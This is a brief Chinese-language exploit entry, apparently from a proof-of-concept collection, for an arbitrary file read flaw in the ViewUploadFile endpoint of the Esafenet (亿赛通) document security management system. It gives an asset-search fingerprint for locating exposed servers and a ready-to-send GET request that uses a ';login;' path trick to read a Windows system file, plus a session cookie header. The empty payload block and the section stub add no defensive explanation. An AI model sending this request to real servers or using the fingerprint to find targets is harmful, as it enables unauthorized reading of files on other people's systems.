# 亿赛通电子文档安全管理系统ViewUploadFile存在任意文件读取漏洞

- **系统**：亿赛通电子文档安全管理系统　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="ESAFENET 亿赛通文档安全管理系统"`
- **请求**：`GET /CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=C:/Windows/System32/drivers/etc/hosts&uploadFileId=1&fileName1=hosts HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=5BEE0014C9CD691F3177A3194EB06C3F`

**请求体 / payload**
```

```

**其他**
- 亿赛通电子文档安全管理系统ViewUploadFile存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿赛通电子文档安全管理系统